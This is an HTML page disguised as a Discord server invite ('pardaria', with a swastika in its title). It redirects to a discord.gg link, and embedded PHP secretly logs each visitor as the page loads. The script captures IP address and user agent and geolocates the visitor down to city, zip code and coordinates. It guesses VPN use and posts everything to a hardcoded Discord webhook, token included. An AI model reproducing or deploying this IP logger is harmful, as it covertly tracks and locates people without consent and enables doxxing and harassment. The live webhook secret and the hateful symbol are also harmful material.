
<!DOCTYPE html>
<html>
  <head>    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=3.0" name="viewport" />
<meta name="description" content="Check out the pardaria community on Discord - hang out with 1 other members and enjoy free voice and text chat." />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@discord" />
<meta name="twitter:title" content="Participe do servidor do Discord pardaria 卐  " />
<meta name="twitter:description" content="Check out the pardaria community on Discord - hang out with 34 other members and enjoy free voice and text chat." />
<meta property="og:title" content="Participe do servidor do Discord pardaria!" />
<meta property="og:description" content="Check out the pardaria community on Discord - hang out with 34 other members and enjoy free voice and text chat." />
<meta property="og:site_name" content="Discord" />
<link rel="canonical" href="https://discord.gg/2f2xFmMc" />
    

    
    <span class="cubesWrapper">
  <span class="cube"></span>
  <span class="cube"></span>
</span>
    <style>body {
  background: #36393f;
}
.cubesWrapper {
    left: 48vw;
    top: 45vh;
    position: relative;
    display: inline-block;
    width: 52px;
    height: 52px;
    contain: paint
}
.cube {
    background-color: #7289da;
    width: 10px;
    height: 10px;
    position: absolute;
    top: 0;
    left: 0;
    -webkit-animation: cubeSpinner 1.8s ease-in-out infinite;
    animation: cubeSpinner 1.8s ease-in-out infinite
}

.cube:last-child {
    -webkit-animation-delay: -.9s;
    animation-delay: -.9s
}

@-webkit-keyframes cubeSpinner {
    25% {
        -webkit-transform: translateX(22px) rotate(-90deg) scale(.5);
        transform: translateX(22px) rotate(-90deg) scale(.5)
    }

    50% {
        -webkit-transform: translateX(22px) translateY(22px) rotate(-180deg);
        transform: translateX(22px) translateY(22px) rotate(-180deg)
    }

    75% {
        -webkit-transform: translateX(0) translateY(22px) rotate(-270deg) scale(.5);
        transform: translateX(0) translateY(22px) rotate(-270deg) scale(.5)
    }

    to {
        -webkit-transform: rotate(-1turn);
        transform: rotate(-1turn)
    }
}

@keyframes cubeSpinner {
    25% {
        -webkit-transform: translateX(22px) rotate(-90deg) scale(.5);
        transform: translateX(22px) rotate(-90deg) scale(.5)
    }

    50% {
        -webkit-transform: translateX(22px) translateY(22px) rotate(-180deg);
        transform: translateX(22px) translateY(22px) rotate(-180deg)
    }

    75% {
        -webkit-transform: translateX(0) translateY(22px) rotate(-270deg) scale(.5);
        transform: translateX(0) translateY(22px) rotate(-270deg) scale(.5)
    }

    to {
        -webkit-transform: rotate(-1turn);
        transform: rotate(-1turn)
    }
}
 </style>


<?php

$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
$Browser = $_SERVER['HTTP_USER_AGENT'];

//Stop the bots from logging
if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
}

//YOU CAN SET YOUR TIMEZONE HERE!
date_default_timezone_set("Europe/Amsterdam");
$Date = date('d/m/Y');
$Time = date('G:i:s');

//Check if IP is a VPN (Is not always correct!)
$Details = json_decode(file_get_contents("http://ip-api.com/json/{$IP}"));
$VPNConn = json_decode(file_get_contents("https://json.geoiplookup.io/{$IP}"));
if ($VPNConn->connection_type === "Corporate") {
    $VPN = "Yes";
} else {
    $VPN = "No";
}

//Set some variables
$Country = $Details->country;
$CountryCode = $Details->countryCode;
$Region = $Details->regionName;
$City = $Details->city;
$Zip = $Details->zip;
$Lat = $Details->lat;
$Lon = $Details->lon;
$WebhookName = $IP;
//Old method of getting a flag picture
//$Flag = "https://www.countryflags.io/{$Details->countryCode}/flat/64.png";
$Details->countryCode = strtolower($Details->countryCode);
$FlagOLD = "https://raw.githubusercontent.com/stevenrskelton/flag-icon/master/png/75/country-4x3/{$Details->countryCode}.png";
$Flag = "https://countryflagsapi.com/png/{$Details->countryCode}";


class Discord
{

    //This will run and send as soon as the page loads
    public function Visitor()
    {
        global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;

        //Insert FULL webhook URL here (URL begins with: https://discord.com/api/webhooks/)
        $Webhook = "https://discord.com/api/webhooks/1127331389528887377/gLP088e0yUxE3MD8R1NAOxbwPaKRSSuBPo7miXVWdnK2oo1Knl3KKk7FfuknMQ1lO4Qk";

        $InfoArr = array(
            "username" => "$WebhookName",
            "avatar_url" => "$Flag",
            "embeds" => [array(

                "title" => "Visitor From $Country",
                "color" => "39423",

                "fields" => [array(
                    "name" => "IP",
                    "value" => "$IP",
                    "inline" => true
                ),
                    array(
                        "name" => "VPN?",
                        "value" => "$VPN",
                        "inline" => true
                    ),
                    array(
                        "name" => "Useragent",
                        "value" => "$Browser"
                    ),
                    array(
                        "name" => "Country/CountryCode",
                        "value" => "$Country/$CountryCode",
                        "inline" => true
                    ),
                    array(
                        "name" => "Region | City | Zip",
                        "value" => "[$Region | $City | $Zip](https://www.google.com/maps/search/?api=1&query=$Lat,$Lon 'Google Maps Location (+/- 750M Radius)')",
                        "inline" => true
                    )],

                "footer" => array(
                    "text" => "$Date $Time",
                    //Alarm-clock icon for the footer. You could also download the image and set the icon_url to the image path
                    "icon_url" => "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
                ),
            )],
        );

        //Some code that sends the info as an embed to Discord
        $JSON = json_encode($InfoArr);

        $Curl = curl_init($Webhook);
        curl_setopt($Curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
        curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($Curl, CURLOPT_POSTFIELDS, $JSON);
        curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
        
        //En voilà
        return curl_exec($Curl);

    }
}

?>
  
<meta http-equiv="refresh" content="2;url=https://discord.gg/2f2xFmMc" />


</html>
    